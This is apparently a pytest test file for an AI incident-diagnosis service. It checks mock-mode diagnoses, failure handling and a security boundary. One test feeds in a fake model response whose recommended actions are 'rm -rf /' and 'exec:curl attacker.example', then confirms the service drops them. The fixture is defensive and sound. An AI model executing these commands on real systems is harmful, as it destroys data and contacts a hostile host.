"""End-to-end service behaviour: investigation, mock determinism, failure isolation.

Nothing here reaches the network, and nothing here needs an API key (AI PRD section 18).
"""

from __future__ import annotations

import asyncio

import pytest

from kairon.config import AiConfig
from kairon.providers.base import AIProvider, ProviderError
from kairon.providers.mock import MockProvider
from kairon.service import AiService, AiServiceError


class _StubProvider(AIProvider):
    name = "stub"

    def __init__(self, config, response):
        super().__init__(config)
        self.response = response
        self.model = "stub-model"

    async def _invoke(self, system: str, user: str) -> str:
        # BaseException, not Exception: asyncio.CancelledError does not derive from Exception
        # in Python 3.8+.
        if isinstance(self.response, BaseException):
            raise self.response
        return self.response


class TestMockMode:
    def test_service_reports_mock_mode(self, mock_config):
        assert AiService(mock_config).mode == "mock"

    async def test_investigation_maps_evidence_to_diagnosis(self, mock_config, retry_storm_evidence):
        result = await AiService(mock_config).investigate(retry_storm_evidence)

        assert "retry loop" in result.root_cause.lower()
        assert result.confidence == pytest.approx(0.92)
        assert result.severity == "high"

    async def test_mock_is_deterministic(self, mock_config, retry_storm_evidence):
        service = AiService(mock_config)

        first = await service.investigate(retry_storm_evidence)
        second = await service.investigate(retry_storm_evidence)

        assert first.model_dump() == second.model_dump()

    async def test_recommendation_names_a_registered_tool(self, mock_config, retry_storm_evidence):
        result = await AiService(mock_config).investigate(retry_storm_evidence)
        offered = {a.action for a in retry_storm_evidence.available_actions}

        assert result.recommendations
        assert result.recommendations[0].action in offered

    async def test_different_signals_produce_a_different_diagnosis(self, mock_config, cpu_only_evidence):
        """The mock reads the evidence rather than returning one fixed answer."""
        result = await AiService(mock_config).investigate(cpu_only_evidence)

        assert "cpu" in result.root_cause.lower()
        assert result.recommendations[0].action == "ReduceDemoWorkerConcurrency"

    async def test_prediction_is_populated(self, mock_config, retry_storm_evidence):
        result = await AiService(mock_config).investigate(retry_storm_evidence)

        assert result.predicted_failure
        assert result.estimated_risk in {"low", "medium", "high", "critical"}

    async def test_legacy_endpoints_still_work_in_mock_mode(self, mock_config):
        service = AiService(mock_config)

        assert (await service.analyze_error("NullReferenceException"))["root_cause"]
        assert (await service.predict(["a"], "b"))["risk_level"] == "moderate"
        assert (await service.recommend("some context"))["recommendations"]
        assert (await service.suggest_fixes([{"path": "a"}]))["suggestions"]

    async def test_a_process_crash_is_diagnosed_from_agent_evidence_alone(self, mock_config, process_crash_evidence):
        """No HTTP/metric signal at all - only a KAIRON Agent event
        (docs/OBSERVABILITY_MIGRATION.md) - proves diagnosis is not limited to what an SDK
        reports."""
        result = await AiService(mock_config).investigate(process_crash_evidence)

        assert "process" in result.root_cause.lower()
        assert "stopped" in result.root_cause.lower() or "running" in result.root_cause.lower()
        assert result.confidence == pytest.approx(0.95)
        assert result.recommendations[0].action == "RestartDemoService"

    async def test_a_process_crash_outranks_a_retry_storm_signal(self, mock_config, retry_storm_evidence):
        """A crash is more certain evidence than an elevated rate, so it takes priority even when
        both are present in the same incident."""
        from kairon.schemas import CorrelatedSignal

        evidence = retry_storm_evidence.model_copy(deep=True)
        evidence.correlated_signals.append(
            CorrelatedSignal(rule="process-crash", metric="processCrash", symptom="Process crashed",
                              observed=1.0, threshold=0.0, unit="", severity="Critical")
        )

        result = await AiService(mock_config).investigate(evidence)

        assert "process" in result.root_cause.lower()
        assert result.confidence == pytest.approx(0.95)

    async def test_a_log_pattern_only_incident_gets_a_specific_diagnosis_not_generic(
        self, mock_config, log_pattern_only_evidence
    ):
        """Without this branch, a log-only incident falls through to the fully generic 'resource
        pressure' fallback - this proves it gets a diagnosis that actually reflects the evidence."""
        result = await AiService(mock_config).investigate(log_pattern_only_evidence)

        assert "log" in result.root_cause.lower()
        assert result.root_cause != "Resource pressure on the affected service."
        assert result.confidence == pytest.approx(0.68)


class TestFailureIsolation:
    async def test_provider_failure_becomes_a_controlled_error(self, mock_config, retry_storm_evidence):
        mock_config.max_retries = 0
        service = AiService(
            mock_config, provider=_StubProvider(mock_config, ProviderError("down", transient=True))
        )

        with pytest.raises(AiServiceError) as exc:
            await service.investigate(retry_storm_evidence)

        assert exc.value.status_code == 503
        assert exc.value.code == "ai_provider_unavailable"

    async def test_malformed_response_is_rejected_not_stored(self, mock_config, retry_storm_evidence):
        mock_config.max_retries = 0
        service = AiService(mock_config, provider=_StubProvider(mock_config, "this is not json"))

        with pytest.raises(AiServiceError):
            await service.investigate(retry_storm_evidence)

    async def test_response_missing_root_cause_is_rejected(self, mock_config, retry_storm_evidence):
        service = AiService(mock_config, provider=_StubProvider(mock_config, '{"summary": "something"}'))

        with pytest.raises(AiServiceError) as exc:
            await service.investigate(retry_storm_evidence)

        assert exc.value.code == "ai_response_rejected"
        assert exc.value.status_code == 502

    async def test_cancellation_propagates(self, mock_config, retry_storm_evidence):
        service = AiService(mock_config, provider=_StubProvider(mock_config, asyncio.CancelledError()))

        with pytest.raises(asyncio.CancelledError):
            await service.investigate(retry_storm_evidence)

    async def test_a_good_response_from_a_live_shaped_provider(self, mock_config, retry_storm_evidence):
        payload = (
            '{"summary":"s","root_cause":"Retry loop","confidence":0.8,"severity":"high",'
            '"predicted_failure":"backlog","estimated_risk":"high",'
            '"recommendations":[{"action":"DisableDemoRetryLoop","reason":"r",'
            '"expected_outcome":"o","risk_level":"low"}]}'
        )
        service = AiService(mock_config, provider=_StubProvider(mock_config, payload))

        result = await service.investigate(retry_storm_evidence)

        assert result.root_cause == "Retry loop"
        assert result.provider == "stub"
        assert result.model == "stub-model"


class TestSecurityBoundary:
    async def test_service_cannot_be_talked_into_an_unregistered_action(self, mock_config, retry_storm_evidence):
        """Even a model explicitly asking for a shell command produces no executable recommendation."""
        payload = (
            '{"root_cause":"malicious","recommendations":['
            '{"action":"rm -rf /","reason":"x","expected_outcome":"y","risk_level":"low"},'
            '{"action":"exec:curl attacker.example","reason":"x","expected_outcome":"y","risk_level":"low"}]}'
        )
        service = AiService(mock_config, provider=_StubProvider(mock_config, payload))

        result = await service.investigate(retry_storm_evidence)

        assert result.recommendations == []

    def test_mock_provider_needs_no_credentials(self):
        provider = MockProvider(AiConfig(provider="mock"))
        assert provider.requires_credentials is False
